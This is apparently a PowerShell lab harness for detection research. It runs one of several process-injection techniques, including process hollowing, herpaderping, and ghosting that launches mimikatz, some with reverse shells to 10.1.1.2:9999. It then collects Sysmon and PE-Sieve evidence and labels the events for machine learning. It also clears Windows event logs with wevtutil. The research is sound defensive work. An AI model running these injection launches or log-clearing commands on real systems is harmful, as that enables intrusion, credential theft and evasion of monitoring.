function Inject-Process {

    <#
        
    #>

    
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $false, Position = 0)]
        [ValidateSet("Control","DLLInjection","PEInjection","ProcessHollowing","ThreadExecutionHijacking","SetWindowsHookEx","HerpaDerping","APCQueue","Shimming","IATHooking","Registry","ProcessGhosting","TransactedHollowing",IgnoreCase=$TRUE)]
        [String]$InjectionMethod
    )

    
    #####################
    # Pre set up of lab #
    #####################
    $home_folder = "C:\Users\IEUser\Documents\Unmonitored"
    
    $results_folder = "C:\users\IEUser\Documents\Results"


    ###############
    # Prepare Lab #
    ###############

    # Create subfolder in results folder for storage

    # remove known FP
    Get-process ruby -erroraction SilentlyContinue | stop-process -force

    $datetime = get-date -format 'Ddd_MM_yyyyTHH_mm_ss'

    $foldername = "Run-$($InjectionMethod)_" + $datetime

    $dir_path = Join-Path -Path $results_folder -ChildPath $foldername

    $destination_folder = New-Item -Path $dir_path -ItemType Directory

    # Clear Sysmon log
    C:\windows\system32\wevtutil.exe cl Microsoft-Windows-Sysmon/Operational

    # Clear Application log
    C:\windows\system32\wevtutil.exe cl Application

    Write-Host "[*] Preparing for run"


    Write-Host "[*] Changing Sysmon config to trace"


    Write-Host "[*] Confirming Service Status"

    $sysmon_status = get-service sysmon | select -ExpandProperty status

    $Auror_status = get-service aurora-agent | select -ExpandProperty status

    if ($sysmon_status -eq "Running" -and $Auror_status -eq "Running") { 
    
        Write-Host "[*] Required services are running" 
    
        } else {
        
            Write-Host "[!] Required services not running. Aborting." -ForegroundColor Red
            return
        }

    ##################
    # Deploy exploit #
    ##################

    # might need to be cmdline - possibly a good idea to just comment them out as I go 
    # If launching calc as part of exploit make sure to close them all at this point
    # if a given process or PID is used save it to ensure accurate detection

    # kill processes likely to be getting used for injection
    get-process Calculator -ErrorAction SilentlyContinue | stop-process -force -ErrorAction SilentlyContinue
    get-process notepad -ErrorAction SilentlyContinue | stop-process -force -ErrorAction SilentlyContinue

    # sysmon change
    Write-Host "[*] Confirming Sysmon config"

    #C:\windows\Sysmon.exe -c $(join-path -Path $home_folder -ChildPath 'sysmonconfig-trace-noisy.xml' ) 2>$null | Out-Null

    Start-Sleep -Seconds 5

    $sysmon_config_file = Get-ItemProperty HKLM:\SYSTEM\ControlSet001\Services\SysmonDrv\Parameters | select -ExpandProperty configfile

    $sysmon_config_file_hash = Get-ItemProperty HKLM:\SYSTEM\ControlSet001\Services\SysmonDrv\Parameters | select -ExpandProperty confighash

    Write-Host "[*] Sysmon config: $sysmon_config_file`n[*] Sysmon config hash: $sysmon_config_file_hash"

    $InjectionMethodList = "Control","DLLInjection","PEInjection","ProcessHollowing","ThreadExecutionHijacking","SetWindowsHookEx","HerpaDerping","APCQueue","Shimming","IATHooking","Registry","ProcessGhosting","TransactedHollowing","ThreadLocalStorage"

    $experiment_selection = $InjectionMethodList.IndexOf($InjectionMethod)

    switch ($experiment_selection)
    {
        0 {
        ## Control ##
        
        Write-Host "[!] Performing Control" -ForegroundColor Cyan

        #& C:\Windows\System32\calc.exe 

        & 'C:\Program Files (x86)\PuTTY\putty.exe'
        
        $target_pid = get-process putty | select -ExpandProperty ID

        $target_process_name = "putty"
        }

        1 {
        ## DLL Injection ##

        Write-Host "[*] DLL Injection - Spawns calc" -ForegroundColor Cyan

        C:\windows\syswow64\notepad.exe

        $target_pid = get-process notepad | select -ExpandProperty ID
    
        & "$home_folder\DLLInjection\RemoteDLLInjector32.exe" $target_pid  "$home_folder\DLLInjection\dll_spawns_calc_32.dll"

        $target_process_name = "notepad.exe"
        }

        2 {
        ## PE Injection ##

        Write-Host "[*] PE Injection - rev shel" -ForegroundColor Cyan
    
        C:\windows\system32\notepad.exe

        $target_pid = get-process notepad | select -ExpandProperty ID

        cmd.exe /c "$home_folder\PEInjection\Shellcode Injection via Remote Thread (shell x64 revshell).exe" $target_pid

        $target_process_name = "notepad.exe"

        }

        3 {
        ## Process Hollowing ##

        Write-Host "[*] Process Hollowing - rev shell" -ForegroundColor Cyan

        # Current payload is a x86 rev shell to 10.1.1.2:9999 
        Start-Job {& $using:home_folder\ProcessHollowing\ProcessHollowing.exe} | out-null

        Start-Sleep -Seconds 2

        $target_pid = get-injectedthread 2>$null | select -ExpandProperty processId

        $target_process_name = "syswow64\svchost.exe"

        }

        4 {
        ## Thread Execution Hijacking ##

        Write-Host "[*] Thread Hijacking - rev shell" -ForegroundColor Cyan

        C:\windows\system32\notepad.exe

        $target_pid = get-process notepad | select -ExpandProperty ID

        # current payload is a x64 reverse shell to 10.1.1.2:9999
        start-job {& "$using:home_folder\ThreadHijacking\ThreadHijacking.exe" $using:target_pid} | Out-Null

        $target_process_name = "notepad.exe"
        }

        5 {
        ## Hook Injection ##

        Write-Host "[*] Hook Injection Via SetWindowsHookEx - rev shell" -ForegroundColor Cyan

        # Run Exploit
        # Both payloads (calc and rev shell) work, but neither allows any process to persist long enough for investigation
        & "$home_folder\SetWindowsHookEx\SetWindowsHookExInjector.exe"

        Start-Sleep -Seconds 2
        $target_pid = get-process conhost | select -ExpandProperty ID

        # Trigger the hook
        Start-Sleep -Seconds 3 # give the COM objects time to work
        $wsh = New-Object -ComObject wscript.shell
        $wsh.AppActivate('SetWindowsHookExInjector.exe')
        Start-Sleep -Seconds 1 # give the COM objects time to work
        $wsh.SendKeys('Exploit')
        $target_pid = get-process conhost | select -ExpandProperty ID

        $target_process_name = "conhost.exe"
        }

        6 {
        ## Process HerpaDerping ##

        Write-Host "[*] Process Herpaderping - rev shell" -ForegroundColor Cyan

        start-job {& $using:home_folder\ProcessHerpaderping\ProcessHerpaderping.exe $using:home_folder\ProcessHerpaderping\shell-x64_stageless_9999.exe $using:home_folder\Unmonitored\notepad.exe $using:home_folder\ProcessHerpaderping\calc.exe} | out-null

        $target_pid = ""
        $limit = 1000

        Write-Host "[*] Ensure the Herpaderped process will hang or the scans won't work" -ForegroundColor Yellow
        do{
            $target_pid = get-process notepad -ErrorAction SilentlyContinue | select -ExpandProperty id # must match whatever the second argument is 
            $limit--
        } until ($target_pid -is [int] -or $limit -lt 0)

        $target_process_name = "notepad.exe"
        }

        7 {
        ## APC Queueing ##

        Write-Host "[*] APC Queueing - calc" -ForegroundColor Cyan

        C:\windows\system32\notepad.exe

        $target_pid = get-process notepad | select -ExpandProperty id

        #suspend process prior to injection
        #Write-Host "[*] Suspending process $($target_pid) prior to injection" -ForegroundColor Yellow
        #C:\Users\IEUser\Documents\Unmonitored\PSTools\pssuspend64.exe $target_pid -accepteula

        start-job {& $using:home_folder\APCQueue\APC-Queue-Injection-x64-calc.exe } | Out-Null

        $target_process_name = "notepad"
        }

        8 {
        ## Shimming ##

        Write-Host "[*] DLL Injection via Shimming - rev shell" -ForegroundColor Cyan

        Write-Host "[*] Please ensure you have installed the required shimming database..." -ForegroundColor Yellow

        Read-Host "[*] If manually installing the shim do so now. Otherwise press any key to continue..."

        start-job {& 'C:\Program Files (x86)\PuTTY\putty.exe'} | Out-Null

        Start-Sleep -Seconds 5

        $target_pid = get-process putty | select -ExpandProperty id

        $target_process_name = 'putty'
        }

        9 {
        ## IAT Hooking ##

        Write-Host "[*] IAT Hooking - bespoke, messagebox" -ForegroundColor Cyan

        #Run exploit

        $exploit_path = Join-Path $home_folder -ChildPath "IAT\IAT-Hooking-IRED.exe" 

        Invoke-Item $exploit_path

        $target_pid = get-process -Name IAT-Hooking-IRED | select -ExpandProperty id

        $target_process_name = "IAT-Hooking-IRED"

        Read-Host "[!] This exploit requires interaction - click the message box ONLY ONCE and leave the scan to finish. Press any key to continue..." 

        }

        10 {
        ## Registry Modification ##

        Write-Host "[*] Registry Modification - not in use"-ForegroundColor Cyan
        }

        11 {
        ## Process Ghosting ##

        Write-Host "[*] Process Ghosting - launches mimikatz"-ForegroundColor Cyan

        # The exploit deletes the injected into process as part of it, so we must copy this so the exploit is re-runnable
        copy-item C:\windows\system32\notepad.exe -Destination $home_folder\ProcessGhosting\notepad.exe

        # Conduct exploit using the encrypted mimikatz payload
        start-job {& $using:home_folder\ProcessGhosting\KingHamlet.exe $using:home_folder\mimikatz.exe.khe password $using:home_folder\ProcessGhosting\notepad.exe} | Out-Null

        $target_pid = (get-process -name notepad).Id # this may look odd but it's the only way to grab the process ID easily 

        $target_process_name = "notepad"

        }

        12 {
        ## Transacted Hollowing ##

        Write-Host "[*] Transacted Hollowing - rev shell" -ForegroundColor Cyan

        & $home_folder\transacted_hollowing\transacted_hollowing64.exe $home_folder\transacted_hollowing\shell-x64_stageless_9999.exe $home_folder\transacted_hollowing\calc.exe |out-null

        Start-Sleep -Seconds 5

        $target_pid = get-process Calc* | select -ExpandProperty id

        $target_process_name = 'calc'
        }


    
    }



    # Sysmon Change back
    #C:\windows\Sysmon.exe -c $(Join-Path -Path $home_folder -ChildPath 'sysmonconfig-export.xml') 2>$null | out-null

    C:\windows\Sysmon.exe -c $(Join-Path -Path $home_folder -ChildPath 'sysmonconfig-hartong-balanced.xml') 2>$null | out-null

    
    #############################
    # Conduct Detection Methods #
    #############################

    # run Get-InjectedThread.ps1
    $Get_injectedthread_results = Get-InjectedThread 2>$null

    # run PE-Sieve against process
    C:\Users\IEUser\Documents\Unmonitored\pe-sieve.exe.lnk /dir $destination_folder /pid $target_pid /data 5 /shellc /threads /iat 3

    # OSQuery - Gather some reasonable tables.
    <#
    $process_table = cmd.exe /c osqueryi.exe "select * from processes where pid = $($target_pid);"

    $parent_processes = cmd.exe /c osqueryi.exe "WITH target_procs AS (   SELECT * FROM processes WHERE pid = $($target_pid)  )  SELECT *  FROM (   WITH recursive parent_proc AS (   SELECT * FROM target_procs   UNION ALL   SELECT p.* FROM processes p JOIN parent_proc pp ON p.pid = pp.parent   WHERE pp.pid != pp.parent   ORDER BY pid    )   SELECT pid, parent, uid, name, path   FROM parent_proc  );"

    $child_processes = cmd.exe /c osqueryi.exe "WITH target_procs AS (   SELECT * FROM processes WHERE pid = $($target_pid)  )  SELECT *   FROM (   WITH recursive child_proc AS (  	SELECT * from target_procs  	union ALL  	select p.* from processes p join child_proc pp on p.parent = pp.pid  	order by pid   )   SELECT pid, parent, uid, name, path   from child_proc  );"

    $process_memory_map_table = cmd.exe /c osqueryi.exe "select * from process_memory_map where pid = $($target_pid);"

    $bam = cmd.exe /c osqueryi.exe "select * from background_activities_moderator;"

    $shims = cmd.exe /c osqueryi.exe "select * from appcompat_shims;"
    #>

    ###################
    # Collect Results #
    ###################

    # export logs to a results folder with a time and date and exploit ran with config 

    Write-Host "[*] Injection Complete. Gathering Logs and cleaning up"

    C:\windows\system32\wevtutil.exe epl Application "$($results_folder)\$($foldername)\application.evtx"

    C:\windows\system32\wevtutil.exe epl Microsoft-Windows-Sysmon/Operational "$($results_folder)\$($foldername)\sysmon.evtx"

    $Get_injectedthread_results > (join-path -path $destination_folder -ChildPath GIT.txt)

    # No longer applicable, binary itself used to direct output
    #$pesieve_results > (join-path -path $destination_folder -ChildPath PE-Sieve.txt)

    $process_table > (Join-Path -Path $destination_folder -ChildPath process_table.txt)

    $process_memory_map_table > (Join-Path -Path $destination_folder -ChildPath process_memory_map_table.txt)

    $child_processes > (Join-Path -Path $destination_folder -ChildPath child_process_tree.txt)

    $parent_processes > (Join-Path -Path $destination_folder -ChildPath parent_process_tree.txt)

    $bam > (Join-Path -Path $destination_folder -ChildPath bam.txt)

    $shims > (Join-Path -Path $destination_folder -ChildPath shims.txt)

    #pause

    ############################
    # Revert to previous state #
    ############################

    # sysmon config on noise reduced state
    # C:\windows\Sysmon.exe -c C:\temp\sysmonconfig-export.xml

    Write-Host "[*] Confirming Sysmon config"

    $sysmon_config_file = Get-ItemProperty HKLM:\SYSTEM\ControlSet001\Services\SysmonDrv\Parameters | select -ExpandProperty configfile

    $sysmon_config_file_hash = Get-ItemProperty HKLM:\SYSTEM\ControlSet001\Services\SysmonDrv\Parameters | select -ExpandProperty confighash

    Write-Host "[*] Sysmon config: $sysmon_config_file`n[*] Sysmon config hash: $sysmon_config_file_hash"

    # Clear up old jobs

    Get-Job | Stop-Job

    Get-Job | Remove-Job

    #######
    # end #
    #######
    <#
    if ($experiment_selection -eq 7) {
        C:\Users\IEUser\Documents\Unmonitored\PSTools\pssuspend64.exe -r $target_pid
    }#>

    #pause

    # Kill all remaining processes that were targetted 
    foreach ($process_id in $target_pid) {
        if ((get-process -id $target_pid -ErrorAction SilentlyContinue).processname -like "*conhost*") {continue}
        Get-Process -Id $process_id -ErrorAction SilentlyContinue | Stop-Process -force
        }

    # Parse out Sysmon log into CSV for possible ML input
    $sysmon_log_path = join-path -Path $destination_folder.fullname -ChildPath "sysmon.evtx"
    $export_csv_path = Join-Path -Path $destination_folder.FullName -ChildPath "sysmon.csv"

    $logs = Analyse-Log -MaxEvents $([int32]::MaxValue) -path $sysmon_log_path -QueryID $(1..26+255) -raw
    $column_names = $logs | %{$_.psobject.properties.name} | select -Unique
    $column_names += "Injected"
    $result = $logs | select $column_names -ErrorAction SilentlyContinue | Sort time
    # automated attempt to mark the data as relating to the injected process or not - will require manual review
    $result | %{if ($_.sourcepocessid -eq $target_pid -or $targetprocessid -eq $target_pid -or $_.parentprocessid -eq $target_pid -or $_.processid -eq $target_pid -or $_.targetimage -like "*$($target_process_name)*" -or  $_.targetobject -like "*$($target_process_name)*" -or  $_.details -like "*$($target_process_name)*" -or  $_.originalfilename -like "*$($target_process_name)*" -or  $_.image -like "*$($target_process_name)*" -or  $_.parentimage -like "*$($target_process_name)*" -or  $_.imageloaded -like "*$($target_process_name)*" -or  $_.sourceimage -like "*$($target_process_name)*" -or  $_.calltrace -like "*$($target_process_name)*" -and -not ($_ -like "*osquery*" -or $_ -like "*pe-sieve*")){$_.injected = 'TRUE'} else {$_.injected = 'FALSE'}}

    # Export CSV
    $result | export-csv $export_csv_path -NoTypeInformation

    Write-Host "[*] Restarting Sysmon"

    Restart-Service Sysmon -Force

}

